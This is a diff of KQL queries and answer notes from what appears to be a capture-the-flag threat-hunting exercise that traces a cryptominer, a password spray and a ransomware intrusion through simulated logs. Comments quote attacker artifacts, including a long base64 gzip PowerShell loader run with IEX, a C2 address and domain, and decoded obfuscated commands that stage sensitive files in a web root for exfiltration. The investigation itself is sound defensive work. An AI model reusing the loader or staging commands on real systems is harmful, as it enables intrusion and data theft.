@@ -176,3 +176,173 @@ ProcessEvents
 // I just installed a cryptomineeeeeeerrrrrrrrr
 // 2024-06-17T15:08:53Z - They not like us, They not like u
 // these answers arent going in. probably a format thing
+
+// Q15 - How many user_agents were used to log in to more than one of the compromised hosts?
+let hostnames = ProcessEvents
+| where process_commandline has "xmrig.exe"
+| distinct hostname;
+AuthenticationEvents
+| where hostname in (hostnames)
+| summarize dcount(hostname) by user_agent
+// count lines more than 1
+// 13
+
+// Q16 - How many of those user_agents were used to log in to all of the compromised hosts?
+// same as prev quer. count 32
+// 9
+
+// Q17 - How many failures did we did we see from user agent "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_9_1; en-US) Gecko/20100101 Firefox/70.0"?
+AuthenticationEvents
+| where user_agent == "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_9_1; en-US) Gecko/20100101 Firefox/70.0"
+| summarize count() by result
+
+// Q18 - What was the most prevalent IP used by the threat actor when this user agent was present?
+let hostnames = ProcessEvents
+| where process_commandline has "xmrig.exe"
+| distinct hostname;
+AuthenticationEvents
+| where hostname in (hostnames)
+| summarize dcount(hostname) by src_ip
+// 2 options
+// 116.236.111.174
+
+// Q19 - What kind of attack did the threat actor use as an initial access vector?
+AuthenticationEvents
+| where user_agent == "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_9_1; en-US) Gecko/20100101 Firefox/70.0"
+| summarize count(hostname) by password_hash
+// spray
+
+// Q20 - What is the MITRE ATT&CK technique ID for this attack type?
+// https://attack.mitre.org/techniques/T1110/003/
+// T1110.003 
+
+
+//////////////////////////////////////// Section 3: Certified Petabyte /////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+// Q1 - about that life
+
+// Q2 - let me at 'em
+
+// Q3 - Whose bios were they looking for?
+InboundNetworkEvents
+| where url contains "bio"
+// company executive
+// additional details: 43.24.78.54 - 2024-07-25T12:57:20Z - 
+
+// Q4 - What is the filename of the note displayed on the producer's computer?
+let hosts =
+ProcessEvents
+| where process_commandline has "xmrig.exe"
+| distinct hostname;
+let prod_hosts = 
+Employees
+| where hostname in (hosts)
+| where role == "Music Producer"
+| distinct hostname;
+FileCreationEvents
+| summarize count()by filename
+// DROP_AND_GIVE_ME_FIFTY.txt
+
+// Q5 - What was the file extension of the locked files?
+let hosts =
+ProcessEvents
+| where process_commandline has "xmrig.exe"
+| distinct hostname;
+let prod_hosts = 
+Employees
+| where hostname in (hosts)
+| where role == "Music Producer"
+| distinct hostname;
+FileCreationEvents
+| extend FileExtension = tostring(split(filename, ".")[-1])
+| summarize count() by FileExtension
+// 616
+
+// Q6 - What was the name of this locked file?
+Employees
+| where role has "Chief"
+// L8MI-MACHINE
+
+FileCreationEvents
+| where hostname == "L8MI-MACHINE"
+| where filename contains "616"
+| distinct filename
+// unreleased_beatz.mp3.616
+
+// Q7 - When was the first time this update was installed?
+ProcessEvents
+| where hostname == "L8MI-MACHINE"
+| where process_commandline contains "update"
+// Explorer.exe "C:\Users\meboomin\Downloads\Music_Production_Server_Update.exe" - 2024-07-29T15:48:38Z
+
+// Q8 - What file did they write these process commands to?
+ProcessEvents
+| where hostname == "L8MI-MACHINE"
+// Interesting - 43.24.78.54:50050
+// 2024-07-31T11:48:29Z 
+// JHM9TmV3LU9iamVjdCBJTy5NZW1vcnlTdHJlYW0oLFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygiSDRzSUFOWVRuV1lBLzZWVysyL2lPQkQrdWZrci9FTWxFaFU0S0wxdTIxT2xKVHpEQVdVSmZleHlDQVhIMElDSmcrMEUwdDM5MzIrY1I0L2VkblVySFZLRUh6UGptYy9mek5nbXNtUkw3bUU1WUM1QnBRZkNoY2Q4ZEs1cHAwMW1TWFNMUGhhMFplaGpxWmJWWUw0aWNoNXdodWVPNjNJaUJQcXFuWXdjN215UmZobzVmTDVsYmtoSkVTVVRKVWpja0JQajVFUTdTWlpDWHpoTE12Y2Q2VVZrdmlYeW1ia0NEdEtuOVNCb3NxM2orYk9ibTBiSU9mRmxPaTkzaUt3TFFiWUw2aEdoRytnYmVud21uSlR1Rm11Q0pmcUtUdWZsRG1VTGgyWmljY1BCenhCUTNYZlZYcDloT0k3NVpUdWdudFFMZi8xVk1LYWw2cXpjMm9VT0ZYckJqb1VrMjdKTGFjRkEzdzExNENRT2lGNFllSmd6d1pheS9PajV0ZlB5ZmVMOU1IRitrUHBlTUxMSVZvRURjZnc4U0dVMTFkRUxNQndCTnZVVXcwSVJUZFY1MDlrTWZYejFaaHo2MHR1U3N1Vkx3bGxnRXg1NW1JaHkxL0ZkU3Naa0NXb0ZBZGZucndvR09NR0pETG1mT2dDK2dGN0VOa1EvOVVOS2kyQjMrcXQyWi9xUTdITndmMVZKUDFZQ3FaSGtSakhqeEsvQUFRd0UzcVRtSUp3ZnZEOGlsd0cvSHdobWFOKzFkNmpxRWtwV2ppUnpDZmdlY1ZVN09aa21Rd0x4NkNNbXZFVHZGbFdLYUFCT09KTHhXRjNuaElmRW1QMXpQK214dWFZby90UlFOZGZLZE5MclNmMjRSZE1INXJrejdjVFFNdmFvOWZraTlLaEx1TnIvZVRZMHlkTHpTVFAybmEySGM4Sy9nVCsvTTdLa01GWEV6OFdHNEtkZXlEYUkyOHpRQWNDQmdqK3F0YmFlZk5VMVUrZnFHTzVkZ0ZkQUNlT3RNK2tkNmdYTEg1QXQ0SmZPZ2FhblMwZ3pra3RucVJYbnA2dTU0bktET2tJVTBTaUVQTWRGWkJPSEVyZUk2cjd3c3ExNktGa3lWQm1UdVRzSXFmU3dJMlJ1YnBZbjVER2syZEVONWtQR2hCaHVGMkNZMkFIQm5rTVZLa1hVOVZ4aXhyYTN5bDA0T3VRSWs0WkRLYVFjV0lyZ1RtQkZZV0ZMeFJrTzN2NkxIMFlaaXF5MURTalpnblJTaGRyVVdVSE55VElxb1p1ekl1NXJIWG5IN1R4UDBxUlFXT1VnSFRrTkJMQXBrMFgwNEhFSmRVM2gvaS9pL1QvMzNwYVlOMjQyT01rdVVrOFNjV3JHVXFWTElvbFZjd0ZLWjFnbXlIRUpxTFU1MjVxT0lKY1hxZ3Y1SzcxUXV3cDNWanhZZjdya25WYlU3dTY2clFsOEVYeTFYYnZWNy9mR2dUbnU0MVo0TitwV2VrdnIwMVh6SXR5SFZqZ3hLN1YyQmVSZWRwM1cwb3J1Mk9kcXVMMm91b0VWRFdGTmZOaDFSZE9LbXZYdStZNjFMMWZlZFdZbjFmKzAyRmNYVDFiN3c2TFR2dWcraUxhUzcxcVIyZDQxcmhtTWY3T2lCdXVCM3RWbDRKdDc5NEswZXBma3FZLzNOWGxGbk5VaC92UGhyQlVPZTU4cllqMkFHT3pyRjl4ckRIdFdSWDU0cmpVN3RkR1hsNWlKdFJVUGYyK0ZRWXczWXIySjhkcU83eWE5R09RMkcycmI1c0UrL3pMNWJiVEUxLzRkRys3ZG5sVnI5eHVWQTltN0wrZEJPSHlhM0cvV3RnM3lsN3pON3U3OW5laXNMdXlRUGUxeEJPdFYyM1lQTGdRV1BjV2ZheU9IdVh2OGtxekhneWFjZmJ3SCtPRGFyblBWaGJoOE0rN3puWWNCYzl3ZHhQM25lR1FuTnQxV3RENWZmbGlDL3hYNzdMRWFkTHY0ZWdmeWw4K1JHUXZuZ3VLTmZYMzN1SHA2d3RmeTBEVmZSbjA4Zk1HMTduWC9vZXBPN3MzTm9Oa3lPL2NQN3Avais2QXpyZzQ3NDByUGZLUnVwM2x2RGlhcmd6bmU5T3FUVm1VOUdMdlZ4LzN0cldMYmtuSG9Id2RWay85QThGK2lNbVdlNGhPd0NBaXExcy9PREZYWFgzZW1wNGRaM29kZjU2WEZBYXpWZmxmY1RIWWkxYXYvcXlNT0hDNmVIUXBNaFFhVmw1YzI0KzJzell5WXB6UjAvZjJYMFlad24xQjROY0M3SWsvS09xVU1xOGI0a3c0RmJUcHRuak1vUHZjd3JKMi9Pekxnd1pRSlFqZE1ZMXFFeTJYU1BMSUk4eDZhQzk3Y2ZJSHdzaHFRZ05nbi9rbytGMUhsVUt0VW9QTlZEaGNWUS90MVdCb3NpTlBPck15QmZtWTg5ZVQ0SkpxY0JMZWFscVRRM3g2WGhQOTdBVzhPL1c5b0ZYaEovMzJGTG5Ib2Zid01yZkJSMDZ6bFA0RGYzQWp2QlY2WFpJZXVFdTRKNlhCWldyTUZQRVdUMnFxZk9nYXlXay9vMUVIZlVRbkNxNHZhT2J4SCtTcFVoUmFseit0dmFPOTRxZUkzTkNhWXdQT28xR01MWUNtQmZxbE1KMGFVc1BaZCt4dlZ3bjZFcndzQUFBPT0iKSk7SUVYIChOZXctT2JqZWN0IElPLlN0cmVhbVJlYWRlcihOZXctT2JqZWN0IElPLkNvbXByZXNzaW9uLkd6aXBTdHJlYW0oJHMsW0lPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV06OkRlY
+// Base64 1 times
+// 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
+
+FileCreationEvents
+| where hostname == "L8MI-MACHINE"
+// Interesting - I see cobaltstrike.exe
+
+// Q9 - What file did they write these process commands to?
+
+
+// Q10 - What is the name of the executable that was used to deploy the ransomware, leading to the encryption of the files?
+FileCreationEvents
+| where hostname == "L8MI-MACHINE"
+// kdot.exe - C:\Users\meboomin\Documents\kdot.exe - 2024-08-02T16:21:34Z
+
+// Q11 - Did the threat actors exploit any vulnerabilities? If so, what vulnerability did they exploit?
+
+
+// Q13 - 
+PassiveDns
+| where ip == "43.24.78.54"
+// Interesting IP I saw coabltstike reaching out to earlier.
+// invisibleupdates.com
+
+// Q15 - What subject did they use?
+Email
+| 
+
+// Q16 - What was the name of this network share? (Provide just the name of the shared drive)
+// Query pulled from Q18
+ProcessEvents
+| where hostname == "L8MI-MACHINE"
+| where process_commandline contains "mv"
+// 2024-08-02T16:32:31Z
+// C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -Command "$enc = 'QzpcV2luZG93c1xTeXN0ZW0zMlxwb3dlcnNoZWxsLmV4ZSAtTm9wIC1FeGVjdXRpb25Qb2xpY3kgYnlwYXNzIC1Db21tYW5kICIkcmV2ID0gJ3Bpei55enppcmRfbGJiXHNkYW9sbndvRFxuaW1vb2JlbVxzcmVzVVw6QyBwaXouYXRhZF9ldml0aXNuZXNcOlogeXBvYyc7JHJldls6Oi0xXSI=';[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($enc))"
+// Base 64
+// C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -Command "$rev = 'piz.yzzird_lbb\sdaolnwoD\nimoobem\sresU\:C piz.atad_evitisnes\:Z ypoc';$rev[::-1]"
+// Reverse
+// copy Z:\sensitive_data.zip C:\Users\meboomin\Downloads\bbl_drizzy.zip'
+
+// Q17 - The threat actors exfiltrated the most important files by staging them in a special folder.
+//       What was the name of this folder?
+// aspnet_client
+// Found the answer from the work I did in Q18
+
+
+// Q18 - What filename did the threat actor rename this sensitive data to?
+ProcessEvents
+| where hostname == "L8MI-MACHINE"
+| where process_commandline contains "mv"
+// 2024-08-02T16:57:06Z
+// 1: QzpcV2luZG93c1xTeXN0ZW0zMlxwb3dlcnNoZWxsLmV4ZSAtTm9wIC1FeGVjdXRpb25Qb2xpY3kgYnlwYXNzIC1Db21tYW5kICIkaGV4ID0gJzQzM2E1YzU3Njk2ZTY0NmY3NzczNWM1Mzc5NzM3NDY1NmQzMzMyNWM3MDZmNzc2NTcyNzM2ODY1NmM2YzJlNjU3ODY1MjAyZDRlNmY3MDIwMmQ0NTc4NjU2Mzc1NzQ2OTZmNmU1MDZmNmM2OTYzNzkyMDYyNzk3MDYxNzM3MzIwMmQ0MzZmNmQ2ZDYxNmU2NDIwMjIyNDcyNjU3NjIwM2QyMDI3NWM3NDZlNjU2OTZjNjM1Zjc0NjU2ZTcwNzM2MTVjNzQ2ZjZmNzI3Nzc3Nzc1YzYyNzU3MDc0NjU2ZTY5NWMzYTQzMjA3MDY5N2EyZTc5N2E3YTY5NzI2NDVmNmM2MjYyNWM3MzY0NjE2ZjZjNmU3NzZmNDQ1YzZlNjk2ZDZmNmY2MjY1NmQ1YzczNzI2NTczNTU1YzNhNDMyMDY1NzY2ZjZkMjczYjI0NzI2NTc2NWIzYTNhMmQzMTVkMjInO1tTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJGhleCkpIg==
+// Base64
+// 2: 433a5c57696e646f77735c53797374656d33325c706f7765727368656c6c2e657865202d4e6f70202d457865637574696f6e506f6c69637920627970617373202d436f6d6d616e64202224726576203d20275c746e65696c635f74656e7073615c746f6f727777775c62757074656e695c3a432070697a2e797a7a6972645f6c62625c7364616f6c6e776f445c6e696d6f6f62656d5c73726573555c3a432065766f6d273b247265765b3a3a2d315d22
+// Hex to text
+// 3: C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -Command "$rev = '\tneilc_tenpsa\toorwww\bupteni\:C piz.yzzird_lbb\sdaolnwoD\nimoobem\sresU\:C evom';$rev[::-1]"
+// Reverse
+// 4: C:\Users\meboomin\Downloads\bbl_drizzy.zip C:\inetpub\wwwroot\aspnet_client\
+// bbl_drizzy.zip 
+
+// Q19 - What Ip did they use?
+// 43.24.78.54
+// As seen in previous work
+
+// Q20 - haters are my motivators
